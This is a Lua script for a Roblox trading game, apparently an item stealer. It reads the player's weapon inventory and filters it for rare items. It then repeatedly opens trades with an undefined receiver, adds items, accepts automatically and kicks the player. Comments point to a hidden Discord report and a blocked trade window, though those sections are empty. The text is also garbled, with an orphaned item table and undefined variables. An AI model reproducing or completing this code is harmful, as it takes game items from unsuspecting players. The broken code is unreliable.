local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local RARITY_ORDER = {
    ["Common"] = 1, ["Uncommon"] = 2, ["Rare"] = 3, ["Legendary"] = 4,
    ["Godly"] = 5, ["Ancient"] = 6, ["Unique"] = 7, ["Vintage"] = 8, ["Chroma"] = 9
}

    DefaultGun=true,DefaultKnife=true,Reaver=true,Reaver_Legendary=true,Reaver_Godly=true,Reaver_Ancient=true,
    IceHammer=true,IceHammer_Legendary=true,IceHammer_Godly=true,IceHammer_Ancient=true,

-- SERVER CHECKS
pcall(function()
    if ReplicatedStorage:FindFirstChild("GetServerType") then
        local st = ReplicatedStorage.GetServerType:InvokeServer()
        if st == "VIPServer" then LocalPlayer:Kick("❌ VIP Server Not Supported") return end
    end
end)
if #Players:GetPlayers() >= 12 then LocalPlayer:Kick("❌ Server Full") return end

local MIN_RARITY_VALUE = RARITY_ORDER[MIN_RARITY] or 5

-- ✅ IMPROVED: MULTIPLE WAYS TO READ INVENTORY + WAIT FOR DATABASE
local Database = nil
for i = 1, 10 do
    pcall(function()
        Database = ReplicatedStorage:WaitForChild("Database", 3):WaitForChild("Sync"):WaitForChild("Item")
    end)
    if Database then break end
    task.wait(0.5)
end
if not Database then
    LocalPlayer:Kick("❌ Cannot load MM2 Database — Try rejoining")
    return
end

local Inventory = nil
for i = 1, 5 do
    pcall(function()
        if ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Inventory") then
            Inventory = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
        end
    end)
    if Inventory and Inventory.Weapons then break end
    task.wait(0.5)
end

local Items = {}
local Counts = {Godly=0,Ancient=0,Unique=0,Vintage=0,Legendary=0,Rare=0,Uncommon=0,Common=0,Chroma=0}

if Inventory and Inventory.Weapons and Inventory.Weapons.Owned then
    for ItemId, Count in pairs(Inventory.Weapons.Owned) do
        if Count and Count > 0 then
            local ItemData = Database[ItemId]
            if ItemData then
                local Name = ItemData.ItemName or "Unknown"
                local Rarity = ItemData.Rarity or "Common"
                local IsChroma = ItemData.Chroma or false
                
                if IsChroma then Rarity = "Chroma" end
                
                if RARITY_ORDER[Rarity] then
                    Counts[Rarity] = (Counts[Rarity] or 0) + Count
                    
                    if not UNTRADABLE[Name] and RARITY_ORDER[Rarity] >= MIN_RARITY_VALUE then
                        table.insert(Items, {Id=ItemId, Name=Name, Rarity=Rarity, Count=Count})
                    end
                end
            end
        end
    end
end

-- SEND DISCORD FIRST — ALWAYS

-- BLOCK TRADE GUI

-- TRADE FUNCTIONS
local function SendTrade() ReplicatedStorage.Trade.SendRequest:InvokeServer(Receiver) end
local function GetStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
local function AddItem(Id) ReplicatedStorage.Trade.OfferItem:FireServer(Id, "Weapons") end
local function Accept() ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582) end
local function WaitEnd() while GetStatus() ~= "None" do task.wait(0.1) end end

-- AUTO TRADE
local Index = 1
local MaxPerTrade = 4
while Index <= #Items do
    local Status = GetStatus()
    if Status == "None" then
        SendTrade()
        task.wait(3)
    elseif Status == "StartTrade" then
        local Added = 0
        while Added < MaxPerTrade and Index <= #Items do
            AddItem(Items[Index].Id)
            Index += 1
            Added += 1
            task.wait(0.2)
        end
        task.wait(5)
        Accept()
        WaitEnd()
        task.wait(1)
    end
    task.wait(0.5)
end

task.wait(2)
LocalPlayer:Kick("✅ All Items Transferred!")
